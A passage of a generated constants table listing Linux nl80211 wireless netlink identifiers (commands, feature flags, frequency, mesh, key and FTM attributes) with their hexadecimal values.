NL80211_CMD_ROAM                                        = 0x2f
NL80211_CMD_SCAN_ABORTED                                = 0x23
NL80211_CMD_SCHED_SCAN_RESULTS                          = 0x4d
NL80211_CMD_SCHED_SCAN_STOPPED                          = 0x4e
NL80211_CMD_SET_BEACON                                  = 0xe
NL80211_CMD_SET_BSS                                     = 0x19
NL80211_CMD_SET_CHANNEL                                 = 0x41
NL80211_CMD_SET_COALESCE                                = 0x65
NL80211_CMD_SET_CQM                                     = 0x3f
NL80211_CMD_SET_INTERFACE                               = 0x6
NL80211_CMD_SET_KEY                                     = 0xa
NL80211_CMD_SET_MAC_ACL                                 = 0x5d
NL80211_CMD_SET_MCAST_RATE                              = 0x5c
NL80211_CMD_SET_MESH_CONFIG                             = 0x1d
NL80211_CMD_SET_MESH_PARAMS                             = 0x1d
NL80211_CMD_SET_MGMT_EXTRA_IE                           = 0x1e
NL80211_CMD_SET_MPATH                                   = 0x16
NL80211_CMD_SET_MULTICAST_TO_UNICAST                    = 0x79
NL80211_CMD_SET_NOACK_MAP                               = 0x57
NL80211_CMD_SET_PMK                                     = 0x7b
NL80211_CMD_SET_PMKSA                                   = 0x34
NL80211_CMD_SET_POWER_SAVE                              = 0x3d
NL80211_CMD_SET_QOS_MAP                                 = 0x68
NL80211_CMD_SET_REG                                     = 0x1a
NL80211_CMD_SET_REKEY_OFFLOAD                           = 0x4f
NL80211_CMD_SET_SAR_SPECS                               = 0x8c
NL80211_CMD_SET_STATION                                 = 0x12
NL80211_CMD_SET_TID_CONFIG                              = 0x89
NL80211_CMD_SET_TX_BITRATE_MASK                         = 0x39
NL80211_CMD_SET_WDS_PEER                                = 0x42
NL80211_CMD_SET_WIPHY                                   = 0x2
NL80211_CMD_SET_WIPHY_NETNS                             = 0x31
NL80211_CMD_SET_WOWLAN                                  = 0x4a
NL80211_CMD_START_AP                                    = 0xf
NL80211_CMD_START_NAN                                   = 0x73
NL80211_CMD_START_P2P_DEVICE                            = 0x59
NL80211_CMD_START_SCHED_SCAN                            = 0x4b
NL80211_CMD_STA_OPMODE_CHANGED                          = 0x80
NL80211_CMD_STOP_AP                                     = 0x10
NL80211_CMD_STOP_NAN                                    = 0x74
NL80211_CMD_STOP_P2P_DEVICE                             = 0x5a
NL80211_CMD_STOP_SCHED_SCAN                             = 0x4c
NL80211_CMD_TDLS_CANCEL_CHANNEL_SWITCH                  = 0x70
NL80211_CMD_TDLS_CHANNEL_SWITCH                         = 0x6f
NL80211_CMD_TDLS_MGMT                                   = 0x52
NL80211_CMD_TDLS_OPER                                   = 0x51
NL80211_CMD_TESTMODE                                    = 0x2d
NL80211_CMD_TRIGGER_SCAN                                = 0x21
NL80211_CMD_UNEXPECTED_4ADDR_FRAME                      = 0x56
NL80211_CMD_UNEXPECTED_FRAME                            = 0x53
NL80211_CMD_UNPROT_BEACON                               = 0x8a
NL80211_CMD_UNPROT_DEAUTHENTICATE                       = 0x46
NL80211_CMD_UNPROT_DISASSOCIATE                         = 0x47
NL80211_CMD_UNSPEC                                      = 0x0
NL80211_CMD_UPDATE_CONNECT_PARAMS                       = 0x7a
NL80211_CMD_UPDATE_FT_IES                               = 0x60
NL80211_CMD_UPDATE_OWE_INFO                             = 0x87
NL80211_CMD_VENDOR                                      = 0x67
NL80211_CMD_WIPHY_REG_CHANGE                            = 0x71
NL80211_COALESCE_CONDITION_MATCH                        = 0x0
NL80211_COALESCE_CONDITION_NO_MATCH                     = 0x1
NL80211_CONN_FAIL_BLOCKED_CLIENT                        = 0x1
NL80211_CONN_FAIL_MAX_CLIENTS                           = 0x0
NL80211_CQM_RSSI_BEACON_LOSS_EVENT                      = 0x2
NL80211_CQM_RSSI_THRESHOLD_EVENT_HIGH                   = 0x1
NL80211_CQM_RSSI_THRESHOLD_EVENT_LOW                    = 0x0
NL80211_CQM_TXE_MAX_INTVL                               = 0x708
NL80211_CRIT_PROTO_APIPA                                = 0x3
NL80211_CRIT_PROTO_DHCP                                 = 0x1
NL80211_CRIT_PROTO_EAPOL                                = 0x2
NL80211_CRIT_PROTO_MAX_DURATION                         = 0x1388
NL80211_CRIT_PROTO_UNSPEC                               = 0x0
NL80211_DFS_AVAILABLE                                   = 0x2
NL80211_DFS_ETSI                                        = 0x2
NL80211_DFS_FCC                                         = 0x1
NL80211_DFS_JP                                          = 0x3
NL80211_DFS_UNAVAILABLE                                 = 0x1
NL80211_DFS_UNSET                                       = 0x0
NL80211_DFS_USABLE                                      = 0x0
NL80211_EDMG_BW_CONFIG_MAX                              = 0xf
NL80211_EDMG_BW_CONFIG_MIN                              = 0x4
NL80211_EDMG_CHANNELS_MAX                               = 0x3c
NL80211_EDMG_CHANNELS_MIN                               = 0x1
NL80211_EXTERNAL_AUTH_ABORT                             = 0x1
NL80211_EXTERNAL_AUTH_START                             = 0x0
NL80211_EXT_FEATURE_4WAY_HANDSHAKE_AP_PSK               = 0x32
NL80211_EXT_FEATURE_4WAY_HANDSHAKE_STA_1X               = 0x10
NL80211_EXT_FEATURE_4WAY_HANDSHAKE_STA_PSK              = 0xf
NL80211_EXT_FEATURE_ACCEPT_BCAST_PROBE_RESP             = 0x12
NL80211_EXT_FEATURE_ACK_SIGNAL_SUPPORT                  = 0x1b
NL80211_EXT_FEATURE_AIRTIME_FAIRNESS                    = 0x21
NL80211_EXT_FEATURE_AP_PMKSA_CACHING                    = 0x22
NL80211_EXT_FEATURE_AQL                                 = 0x28
NL80211_EXT_FEATURE_BEACON_PROTECTION                   = 0x29
NL80211_EXT_FEATURE_BEACON_PROTECTION_CLIENT            = 0x2e
NL80211_EXT_FEATURE_BEACON_RATE_HE                      = 0x36
NL80211_EXT_FEATURE_BEACON_RATE_HT                      = 0x7
NL80211_EXT_FEATURE_BEACON_RATE_LEGACY                  = 0x6
NL80211_EXT_FEATURE_BEACON_RATE_VHT                     = 0x8
NL80211_EXT_FEATURE_BSS_PARENT_TSF                      = 0x4
NL80211_EXT_FEATURE_CAN_REPLACE_PTK0                    = 0x1f
NL80211_EXT_FEATURE_CONTROL_PORT_NO_PREAUTH             = 0x2a
NL80211_EXT_FEATURE_CONTROL_PORT_OVER_NL80211           = 0x1a
NL80211_EXT_FEATURE_CONTROL_PORT_OVER_NL80211_TX_STATUS = 0x30
NL80211_EXT_FEATURE_CQM_RSSI_LIST                       = 0xd
NL80211_EXT_FEATURE_DATA_ACK_SIGNAL_SUPPORT             = 0x1b
NL80211_EXT_FEATURE_DEL_IBSS_STA                        = 0x2c
NL80211_EXT_FEATURE_DFS_OFFLOAD                         = 0x19
NL80211_EXT_FEATURE_ENABLE_FTM_RESPONDER                = 0x20
NL80211_EXT_FEATURE_EXT_KEY_ID                          = 0x24
NL80211_EXT_FEATURE_FILS_DISCOVERY                      = 0x34
NL80211_EXT_FEATURE_FILS_MAX_CHANNEL_TIME               = 0x11
NL80211_EXT_FEATURE_FILS_SK_OFFLOAD                     = 0xe
NL80211_EXT_FEATURE_FILS_STA                            = 0x9
NL80211_EXT_FEATURE_HIGH_ACCURACY_SCAN                  = 0x18
NL80211_EXT_FEATURE_LOW_POWER_SCAN                      = 0x17
NL80211_EXT_FEATURE_LOW_SPAN_SCAN                       = 0x16
NL80211_EXT_FEATURE_MFP_OPTIONAL                        = 0x15
NL80211_EXT_FEATURE_MGMT_TX_RANDOM_TA                   = 0xa
NL80211_EXT_FEATURE_MGMT_TX_RANDOM_TA_CONNECTED         = 0xb
NL80211_EXT_FEATURE_MULTICAST_REGISTRATIONS             = 0x2d
NL80211_EXT_FEATURE_MU_MIMO_AIR_SNIFFER                 = 0x2
NL80211_EXT_FEATURE_OCE_PROBE_REQ_DEFERRAL_SUPPRESSION  = 0x14
NL80211_EXT_FEATURE_OCE_PROBE_REQ_HIGH_TX_RATE          = 0x13
NL80211_EXT_FEATURE_OPERATING_CHANNEL_VALIDATION        = 0x31
NL80211_EXT_FEATURE_PROTECTED_TWT                       = 0x2b
NL80211_EXT_FEATURE_PROT_RANGE_NEGO_AND_MEASURE         = 0x39
NL80211_EXT_FEATURE_RRM                                 = 0x1
NL80211_EXT_FEATURE_SAE_OFFLOAD                         = 0x26
NL80211_EXT_FEATURE_SAE_OFFLOAD_AP                      = 0x33
NL80211_EXT_FEATURE_SCAN_FREQ_KHZ                       = 0x2f
NL80211_EXT_FEATURE_SCAN_MIN_PREQ_CONTENT               = 0x1e
NL80211_EXT_FEATURE_SCAN_RANDOM_SN                      = 0x1d
NL80211_EXT_FEATURE_SCAN_START_TIME                     = 0x3
NL80211_EXT_FEATURE_SCHED_SCAN_BAND_SPECIFIC_RSSI_THOLD = 0x23
NL80211_EXT_FEATURE_SCHED_SCAN_RELATIVE_RSSI            = 0xc
NL80211_EXT_FEATURE_SECURE_LTF                          = 0x37
NL80211_EXT_FEATURE_SECURE_RTT                          = 0x38
NL80211_EXT_FEATURE_SET_SCAN_DWELL                      = 0x5
NL80211_EXT_FEATURE_STA_TX_PWR                          = 0x25
NL80211_EXT_FEATURE_TXQS                                = 0x1c
NL80211_EXT_FEATURE_UNSOL_BCAST_PROBE_RESP              = 0x35
NL80211_EXT_FEATURE_VHT_IBSS                            = 0x0
NL80211_EXT_FEATURE_VLAN_OFFLOAD                        = 0x27
NL80211_FEATURE_ACKTO_ESTIMATION                        = 0x800000
NL80211_FEATURE_ACTIVE_MONITOR                          = 0x20000
NL80211_FEATURE_ADVERTISE_CHAN_LIMITS                   = 0x4000
NL80211_FEATURE_AP_MODE_CHAN_WIDTH_CHANGE               = 0x40000
NL80211_FEATURE_AP_SCAN                                 = 0x100
NL80211_FEATURE_CELL_BASE_REG_HINTS                     = 0x8
NL80211_FEATURE_DS_PARAM_SET_IE_IN_PROBES               = 0x80000
NL80211_FEATURE_DYNAMIC_SMPS                            = 0x2000000
NL80211_FEATURE_FULL_AP_CLIENT_STATE                    = 0x8000
NL80211_FEATURE_HT_IBSS                                 = 0x2
NL80211_FEATURE_INACTIVITY_TIMER                        = 0x4
NL80211_FEATURE_LOW_PRIORITY_SCAN                       = 0x40
NL80211_FEATURE_MAC_ON_CREATE                           = 0x8000000
NL80211_FEATURE_ND_RANDOM_MAC_ADDR                      = 0x80000000
NL80211_FEATURE_NEED_OBSS_SCAN                          = 0x400
NL80211_FEATURE_P2P_DEVICE_NEEDS_CHANNEL                = 0x10
NL80211_FEATURE_P2P_GO_CTWIN                            = 0x800
NL80211_FEATURE_P2P_GO_OPPPS                            = 0x1000
NL80211_FEATURE_QUIET                                   = 0x200000
NL80211_FEATURE_SAE                                     = 0x20
NL80211_FEATURE_SCAN_FLUSH                              = 0x80
NL80211_FEATURE_SCAN_RANDOM_MAC_ADDR                    = 0x20000000
NL80211_FEATURE_SCHED_SCAN_RANDOM_MAC_ADDR              = 0x40000000
NL80211_FEATURE_SK_TX_STATUS                            = 0x1
NL80211_FEATURE_STATIC_SMPS                             = 0x1000000
NL80211_FEATURE_SUPPORTS_WMM_ADMISSION                  = 0x4000000
NL80211_FEATURE_TDLS_CHANNEL_SWITCH                     = 0x10000000
NL80211_FEATURE_TX_POWER_INSERTION                      = 0x400000
NL80211_FEATURE_USERSPACE_MPM                           = 0x10000
NL80211_FEATURE_VIF_TXPOWER                             = 0x200
NL80211_FEATURE_WFA_TPC_IE_IN_PROBES                    = 0x100000
NL80211_FILS_DISCOVERY_ATTR_INT_MAX                     = 0x2
NL80211_FILS_DISCOVERY_ATTR_INT_MIN                     = 0x1
NL80211_FILS_DISCOVERY_ATTR_MAX                         = 0x3
NL80211_FILS_DISCOVERY_ATTR_TMPL                        = 0x3
NL80211_FILS_DISCOVERY_TMPL_MIN_LEN                     = 0x2a
NL80211_FREQUENCY_ATTR_16MHZ                            = 0x19
NL80211_FREQUENCY_ATTR_1MHZ                             = 0x15
NL80211_FREQUENCY_ATTR_2MHZ                             = 0x16
NL80211_FREQUENCY_ATTR_4MHZ                             = 0x17
NL80211_FREQUENCY_ATTR_8MHZ                             = 0x18
NL80211_FREQUENCY_ATTR_DFS_CAC_TIME                     = 0xd
NL80211_FREQUENCY_ATTR_DFS_STATE                        = 0x7
NL80211_FREQUENCY_ATTR_DFS_TIME                         = 0x8
NL80211_FREQUENCY_ATTR_DISABLED                         = 0x2
NL80211_FREQUENCY_ATTR_FREQ                             = 0x1
NL80211_FREQUENCY_ATTR_GO_CONCURRENT                    = 0xf
NL80211_FREQUENCY_ATTR_INDOOR_ONLY                      = 0xe
NL80211_FREQUENCY_ATTR_IR_CONCURRENT                    = 0xf
NL80211_FREQUENCY_ATTR_MAX                              = 0x1b
NL80211_FREQUENCY_ATTR_MAX_TX_POWER                     = 0x6
NL80211_FREQUENCY_ATTR_NO_10MHZ                         = 0x11
NL80211_FREQUENCY_ATTR_NO_160MHZ                        = 0xc
NL80211_FREQUENCY_ATTR_NO_20MHZ                         = 0x10
NL80211_FREQUENCY_ATTR_NO_80MHZ                         = 0xb
NL80211_FREQUENCY_ATTR_NO_HE                            = 0x13
NL80211_FREQUENCY_ATTR_NO_HT40_MINUS                    = 0x9
NL80211_FREQUENCY_ATTR_NO_HT40_PLUS                     = 0xa
NL80211_FREQUENCY_ATTR_NO_IBSS                          = 0x3
NL80211_FREQUENCY_ATTR_NO_IR                            = 0x3
NL80211_FREQUENCY_ATTR_OFFSET                           = 0x14
NL80211_FREQUENCY_ATTR_PASSIVE_SCAN                     = 0x3
NL80211_FREQUENCY_ATTR_RADAR                            = 0x5
NL80211_FREQUENCY_ATTR_WMM                              = 0x12
NL80211_FTM_RESP_ATTR_CIVICLOC                          = 0x3
NL80211_FTM_RESP_ATTR_ENABLED                           = 0x1
NL80211_FTM_RESP_ATTR_LCI                               = 0x2
NL80211_FTM_RESP_ATTR_MAX                               = 0x3
NL80211_FTM_STATS_ASAP_NUM                              = 0x4
NL80211_FTM_STATS_FAILED_NUM                            = 0x3
NL80211_FTM_STATS_MAX                                   = 0xa
NL80211_FTM_STATS_NON_ASAP_NUM                          = 0x5
NL80211_FTM_STATS_OUT_OF_WINDOW_TRIGGERS_NUM            = 0x9
NL80211_FTM_STATS_PAD                                   = 0xa
NL80211_FTM_STATS_PARTIAL_NUM                           = 0x2
NL80211_FTM_STATS_RESCHEDULE_REQUESTS_NUM               = 0x8
NL80211_FTM_STATS_SUCCESS_NUM                           = 0x1
NL80211_FTM_STATS_TOTAL_DURATION_MSEC                   = 0x6
NL80211_FTM_STATS_UNKNOWN_TRIGGERS_NUM                  = 0x7
NL80211_HE_BSS_COLOR_ATTR_COLOR                         = 0x1
NL80211_HE_BSS_COLOR_ATTR_DISABLED                      = 0x2
NL80211_HE_BSS_COLOR_ATTR_MAX                           = 0x3
NL80211_HE_BSS_COLOR_ATTR_PARTIAL                       = 0x3
NL80211_HE_MAX_CAPABILITY_LEN                           = 0x36
NL80211_HE_MIN_CAPABILITY_LEN                           = 0x10
NL80211_HE_NSS_MAX                                      = 0x8
NL80211_HE_OBSS_PD_ATTR_BSS_COLOR_BITMAP                = 0x4
NL80211_HE_OBSS_PD_ATTR_MAX                             = 0x6
NL80211_HE_OBSS_PD_ATTR_MAX_OFFSET                      = 0x2
NL80211_HE_OBSS_PD_ATTR_MIN_OFFSET                      = 0x1
NL80211_HE_OBSS_PD_ATTR_NON_SRG_MAX_OFFSET              = 0x3
NL80211_HE_OBSS_PD_ATTR_PARTIAL_BSSID_BITMAP            = 0x5
NL80211_HE_OBSS_PD_ATTR_SR_CTRL                         = 0x6
NL80211_HIDDEN_SSID_NOT_IN_USE                          = 0x0
NL80211_HIDDEN_SSID_ZERO_CONTENTS                       = 0x2
NL80211_HIDDEN_SSID_ZERO_LEN                            = 0x1
NL80211_HT_CAPABILITY_LEN                               = 0x1a
NL80211_IFACE_COMB_BI_MIN_GCD                           = 0x7
NL80211_IFACE_COMB_LIMITS                               = 0x1
NL80211_IFACE_COMB_MAXNUM                               = 0x2
NL80211_IFACE_COMB_NUM_CHANNELS                         = 0x4
NL80211_IFACE_COMB_RADAR_DETECT_REGIONS                 = 0x6
NL80211_IFACE_COMB_RADAR_DETECT_WIDTHS                  = 0x5
NL80211_IFACE_COMB_STA_AP_BI_MATCH                      = 0x3
NL80211_IFACE_COMB_UNSPEC                               = 0x0
NL80211_IFACE_LIMIT_MAX                                 = 0x1
NL80211_IFACE_LIMIT_TYPES                               = 0x2
NL80211_IFACE_LIMIT_UNSPEC                              = 0x0
NL80211_IFTYPE_ADHOC                                    = 0x1
NL80211_IFTYPE_AKM_ATTR_IFTYPES                         = 0x1
NL80211_IFTYPE_AKM_ATTR_MAX                             = 0x2
NL80211_IFTYPE_AKM_ATTR_SUITES                          = 0x2
NL80211_IFTYPE_AP                                       = 0x3
NL80211_IFTYPE_AP_VLAN                                  = 0x4
NL80211_IFTYPE_MAX                                      = 0xc
NL80211_IFTYPE_MESH_POINT                               = 0x7
NL80211_IFTYPE_MONITOR                                  = 0x6
NL80211_IFTYPE_NAN                                      = 0xc
NL80211_IFTYPE_OCB                                      = 0xb
NL80211_IFTYPE_P2P_CLIENT                               = 0x8
NL80211_IFTYPE_P2P_DEVICE                               = 0xa
NL80211_IFTYPE_P2P_GO                                   = 0x9
NL80211_IFTYPE_STATION                                  = 0x2
NL80211_IFTYPE_UNSPECIFIED                              = 0x0
NL80211_IFTYPE_WDS                                      = 0x5
NL80211_KCK_EXT_LEN                                     = 0x18
NL80211_KCK_LEN                                         = 0x10
NL80211_KEK_EXT_LEN                                     = 0x20
NL80211_KEK_LEN                                         = 0x10
NL80211_KEYTYPE_GROUP                                   = 0x0
NL80211_KEYTYPE_PAIRWISE                                = 0x1
NL80211_KEYTYPE_PEERKEY                                 = 0x2
NL80211_KEY_CIPHER                                      = 0x3
NL80211_KEY_DATA                                        = 0x1
NL80211_KEY_DEFAULT                                     = 0x5
NL80211_KEY_DEFAULT_BEACON                              = 0xa
NL80211_KEY_DEFAULT_MGMT                                = 0x6
NL80211_KEY_DEFAULT_TYPES                               = 0x8
NL80211_KEY_DEFAULT_TYPE_MULTICAST                      = 0x2
NL80211_KEY_DEFAULT_TYPE_UNICAST                        = 0x1
NL80211_KEY_IDX                                         = 0x2
NL80211_KEY_MAX                                         = 0xa
NL80211_KEY_MODE                                        = 0x9
NL80211_KEY_NO_TX                                       = 0x1
NL80211_KEY_RX_TX                                       = 0x0
NL80211_KEY_SEQ                                         = 0x4
NL80211_KEY_SET_TX                                      = 0x2
NL80211_KEY_TYPE                                        = 0x7
NL80211_MAX_NR_AKM_SUITES                               = 0x2
NL80211_MAX_NR_CIPHER_SUITES                            = 0x5
NL80211_MAX_SUPP_HT_RATES                               = 0x4d
NL80211_MAX_SUPP_RATES                                  = 0x20
NL80211_MAX_SUPP_REG_RULES                              = 0x80
NL80211_MESHCONF_ATTR_MAX                               = 0x1f
NL80211_MESHCONF_AUTO_OPEN_PLINKS                       = 0x7
NL80211_MESHCONF_AWAKE_WINDOW                           = 0x1b
NL80211_MESHCONF_CONFIRM_TIMEOUT                        = 0x2
NL80211_MESHCONF_CONNECTED_TO_AS                        = 0x1f
NL80211_MESHCONF_CONNECTED_TO_GATE                      = 0x1d
NL80211_MESHCONF_ELEMENT_TTL                            = 0xf
NL80211_MESHCONF_FORWARDING                             = 0x13
NL80211_MESHCONF_GATE_ANNOUNCEMENTS                     = 0x11
NL80211_MESHCONF_HOLDING_TIMEOUT                        = 0x3
NL80211_MESHCONF_HT_OPMODE                              = 0x16
NL80211_MESHCONF_HWMP_ACTIVE_PATH_TIMEOUT               = 0xb
NL80211_MESHCONF_HWMP_CONFIRMATION_INTERVAL             = 0x19
NL80211_MESHCONF_HWMP_MAX_PREQ_RETRIES                  = 0x8
NL80211_MESHCONF_HWMP_NET_DIAM_TRVS_TIME                = 0xd
NL80211_MESHCONF_HWMP_PATH_TO_ROOT_TIMEOUT              = 0x17
NL80211_MESHCONF_HWMP_PERR_MIN_INTERVAL                 = 0x12
NL80211_MESHCONF_HWMP_PREQ_MIN_INTERVAL                 = 0xc
NL80211_MESHCONF_HWMP_RANN_INTERVAL                     = 0x10
NL80211_MESHCONF_HWMP_ROOTMODE                          = 0xe
NL80211_MESHCONF_HWMP_ROOT_INTERVAL                     = 0x18
NL80211_MESHCONF_MAX_PEER_LINKS                         = 0x4
NL80211_MESHCONF_MAX_RETRIES                            = 0x5
NL80211_MESHCONF_MIN_DISCOVERY_TIMEOUT                  = 0xa
NL80211_MESHCONF_NOLEARN                                = 0x1e
NL80211_MESHCONF_PATH_REFRESH_TIME                      = 0x9
NL80211_MESHCONF_PLINK_TIMEOUT                          = 0x1c
NL80211_MESHCONF_POWER_MODE                             = 0x1a
NL80211_MESHCONF_RETRY_TIMEOUT                          = 0x1
NL80211_MESHCONF_RSSI_THRESHOLD                         = 0x14
NL80211_MESHCONF_SYNC_OFFSET_MAX_NEIGHBOR               = 0x15
NL80211_MESHCONF_TTL                                    = 0x6
NL80211_MESH_POWER_ACTIVE                               = 0x1
NL80211_MESH_POWER_DEEP_SLEEP                           = 0x3
NL80211_MESH_POWER_LIGHT_SLEEP                          = 0x2
NL80211_MESH_POWER_MAX                                  = 0x3
NL80211_MESH_POWER_UNKNOWN                              = 0x0
NL80211_MESH_SETUP_ATTR_MAX                             = 0x8
NL80211_MESH_SETUP_AUTH_PROTOCOL                        = 0x8
NL80211_MESH_SETUP_ENABLE_VENDOR_METRIC                 = 0x2
NL80211_MESH_SETUP_ENABLE_VENDOR_PATH_SEL               = 0x1
NL80211_MESH_SETUP_ENABLE_VENDOR_SYNC                   = 0x6
NL80211_MESH_SETUP_IE                                   = 0x3
NL80211_MESH_SETUP_USERSPACE_AMPE                       = 0x5
NL80211_MESH_SETUP_USERSPACE_AUTH                       = 0x4
NL80211_MESH_SETUP_USERSPACE_MPM                        = 0x7
NL80211_MESH_SETUP_VENDOR_PATH_SEL_IE                   = 0x3
NL80211_MFP_NO                                          = 0x0
NL80211_MFP_OPTIONAL                                    = 0x2
NL80211_MFP_REQUIRED                                    = 0x1
NL80211_MIN_REMAIN_ON_CHANNEL_TIME                      = 0xa
NL80211_MNTR_FLAG_ACTIVE                                = 0x6
NL80211_MNTR_FLAG_CONTROL                               = 0x3
NL80211_MNTR_FLAG_COOK_FRAMES                           = 0x5
NL80211_MNTR_FLAG_FCSFAIL                               = 0x1
NL80211_MNTR_FLAG_MAX                                   = 0x6
NL80211_MNTR_FLAG_OTHER_BSS                             = 0x4
NL80211_MNTR_FLAG_PLCPFAIL                              = 0x2
NL80211_MPATH_FLAG_ACTIVE                               = 0x1
NL80211_MPATH_FLAG_FIXED                                = 0x8
NL80211_MPATH_FLAG_RESOLVED                             = 0x10
NL80211_MPATH_FLAG_RESOLVING                            = 0x2
NL80211_MPATH_FLAG_SN_VALID                             = 0x4
NL80211_MPATH_INFO_DISCOVERY_RETRIES                    = 0x7
NL80211_MPATH_INFO_DISCOVERY_TIMEOUT                    = 0x6
NL80211_MPATH_INFO_EXPTIME                              = 0x4
NL80211_MPATH_INFO_FLAGS                                = 0x5
NL80211_MPATH_INFO_FRAME_QLEN                           = 0x1
NL80211_MPATH_INFO_HOP_COUNT                            = 0x8
NL80211_MPATH_INFO_MAX                                  = 0x9
NL80211_MPATH_INFO_METRIC                               = 0x3
NL80211_MPATH_INFO_PATH_CHANGE                          = 0x9
NL80211_MPATH_INFO_SN                                   = 0x2
NL80211_NAN_FUNC_ATTR_MAX                               = 0x10
NL80211_NAN_FUNC_CLOSE_RANGE                            = 0x9
NL80211_NAN_FUNC_FOLLOW_UP                              = 0x2
NL80211_NAN_FUNC_FOLLOW_UP_DEST                         = 0x8
NL80211_NAN_FUNC_FOLLOW_UP_ID                           = 0x6
NL80211_NAN_FUNC_FOLLOW_UP_REQ_ID                       = 0x7
NL80211_NAN_FUNC_INSTANCE_ID                            = 0xf
NL80211_NAN_FUNC_MAX_TYPE                               = 0x2
NL80211_NAN_FUNC_PUBLISH                                = 0x0
NL80211_NAN_FUNC_PUBLISH_BCAST                          = 0x4
NL80211_NAN_FUNC_PUBLISH_TYPE                           = 0x3
NL80211_NAN_FUNC_RX_MATCH_FILTER                        = 0xd
NL80211_NAN_FUNC_SERVICE_ID                             = 0x2
NL80211_NAN_FUNC_SERVICE_ID_LEN                         = 0x6
NL80211_NAN_FUNC_SERVICE_INFO                           = 0xb
NL80211_NAN_FUNC_SERVICE_SPEC_INFO_MAX_LEN              = 0xff
NL80211_NAN_FUNC_SRF                                    = 0xc
NL80211_NAN_FUNC_SRF_MAX_LEN                            = 0xff
NL80211_NAN_FUNC_SUBSCRIBE                              = 0x1
NL80211_NAN_FUNC_SUBSCRIBE_ACTIVE                       = 0x5
NL80211_NAN_FUNC_TERM_REASON                            = 0x10
NL80211_NAN_FUNC_TERM_REASON_ERROR                      = 0x2
NL80211_NAN_FUNC_TERM_REASON_TTL_EXPIRED                = 0x1
NL80211_NAN_FUNC_TERM_REASON_USER_REQUEST               = 0x0
NL80211_NAN_FUNC_TTL                                    = 0xa
NL80211_NAN_FUNC_TX_MATCH_FILTER                        = 0xe
NL80211_NAN_FUNC_TYPE                                   = 0x1
NL80211_NAN_MATCH_ATTR_MAX                              = 0x2
NL80211_NAN_MATCH_FUNC_LOCAL                            = 0x1
NL80211_NAN_MATCH_FUNC_PEER                             = 0x2
NL80211_NAN_SOLICITED_PUBLISH                           = 0x1
NL80211_NAN_SRF_ATTR_MAX                                = 0x4
NL80211_NAN_SRF_BF                                      = 0x2
NL80211_NAN_SRF_BF_IDX                                  = 0x3
NL80211_NAN_SRF_INCLUDE                                 = 0x1
NL80211_NAN_SRF_MAC_ADDRS                               = 0x4
NL80211_NAN_UNSOLICITED_PUBLISH                         = 0x2
NL80211_NUM_ACS                                         = 0x4
NL80211_P2P_PS_SUPPORTED                                = 0x1
NL80211_P2P_PS_UNSUPPORTED                              = 0x0
NL80211_PKTPAT_MASK                                     = 0x1
NL80211_PKTPAT_OFFSET                                   = 0x3
NL80211_PKTPAT_PATTERN                                  = 0x2
NL80211_PLINK_ACTION_BLOCK                              = 0x2
NL80211_PLINK_ACTION_NO_ACTION                          = 0x0
NL80211_PLINK_ACTION_OPEN                               = 0x1
NL80211_PLINK_BLOCKED                                   = 0x6
NL80211_PLINK_CNF_RCVD                                  = 0x3
NL80211_PLINK_ESTAB                                     = 0x4
NL80211_PLINK_HOLDING                                   = 0x5
NL80211_PLINK_LISTEN                                    = 0x0
NL80211_PLINK_OPN_RCVD                                  = 0x2
NL80211_PLINK_OPN_SNT                                   = 0x1
NL80211_PMKSA_CANDIDATE_BSSID                           = 0x2
NL80211_PMKSA_CANDIDATE_INDEX                           = 0x1
NL80211_PMKSA_CANDIDATE_PREAUTH                         = 0x3
NL80211_PMSR_ATTR_MAX                                   = 0x5
NL80211_PMSR_ATTR_MAX_PEERS                             = 0x1
NL80211_PMSR_ATTR_PEERS                                 = 0x5
NL80211_PMSR_ATTR_RANDOMIZE_MAC_ADDR                    = 0x3
NL80211_PMSR_ATTR_REPORT_AP_TSF                         = 0x2
NL80211_PMSR_ATTR_TYPE_CAPA                             = 0x4
NL80211_PMSR_FTM_CAPA_ATTR_ASAP                         = 0x1
NL80211_PMSR_FTM_CAPA_ATTR_BANDWIDTHS                   = 0x6
NL80211_PMSR_FTM_CAPA_ATTR_MAX                          = 0xa
NL80211_PMSR_FTM_CAPA_ATTR_MAX_BURSTS_EXPONENT          = 0x7
NL80211_PMSR_FTM_CAPA_ATTR_MAX_FTMS_PER_BURST           = 0x8
NL80211_PMSR_FTM_CAPA_ATTR_NON_ASAP                     = 0x2
NL80211_PMSR_FTM_CAPA_ATTR_NON_TRIGGER_BASED            = 0xa
NL80211_PMSR_FTM_CAPA_ATTR_PREAMBLES                    = 0x5
NL80211_PMSR_FTM_CAPA_ATTR_REQ_CIVICLOC                 = 0x4
NL80211_PMSR_FTM_CAPA_ATTR_REQ_LCI                      = 0x3
NL80211_PMSR_FTM_CAPA_ATTR_TRIGGER_BASED                = 0x9
NL80211_PMSR_FTM_FAILURE_BAD_CHANGED_PARAMS             = 0x7
NL80211_PMSR_FTM_FAILURE_INVALID_TIMESTAMP              = 0x5
NL80211_PMSR_FTM_FAILURE_NO_RESPONSE                    = 0x1
NL80211_PMSR_FTM_FAILURE_PEER_BUSY                      = 0x6
NL80211_PMSR_FTM_FAILURE_PEER_NOT_CAPABLE               = 0x4
NL80211_PMSR_FTM_FAILURE_REJECTED                       = 0x2
NL80211_PMSR_FTM_FAILURE_UNSPECIFIED                    = 0x0
NL80211_PMSR_FTM_FAILURE_WRONG_CHANNEL                  = 0x3
NL80211_PMSR_FTM_REQ_ATTR_ASAP                          = 0x1
NL80211_PMSR_FTM_REQ_ATTR_BURST_DURATION                = 0x5
NL80211_PMSR_FTM_REQ_ATTR_BURST_PERIOD                  = 0x4
NL80211_PMSR_FTM_REQ_ATTR_FTMS_PER_BURST                = 0x6
NL80211_PMSR_FTM_REQ_ATTR_LMR_FEEDBACK                  = 0xc
NL80211_PMSR_FTM_REQ_ATTR_MAX                           = 0xd
NL80211_PMSR_FTM_REQ_ATTR_NON_TRIGGER_BASED             = 0xb
NL80211_PMSR_FTM_REQ_ATTR_NUM_BURSTS_EXP                = 0x3
NL80211_PMSR_FTM_REQ_ATTR_NUM_FTMR_RETRIES              = 0x7
NL80211_PMSR_FTM_REQ_ATTR_PREAMBLE                      = 0x2
NL80211_PMSR_FTM_REQ_ATTR_REQUEST_CIVICLOC              = 0x9
NL80211_PMSR_FTM_REQ_ATTR_REQUEST_LCI                   = 0x8
NL80211_PMSR_FTM_REQ_ATTR_TRIGGER_BASED                 = 0xa
NL80211_PMSR_FTM_RESP_ATTR_BURST_DURATION               = 0x7
NL80211_PMSR_FTM_RESP_ATTR_BURST_INDEX                  = 0x2
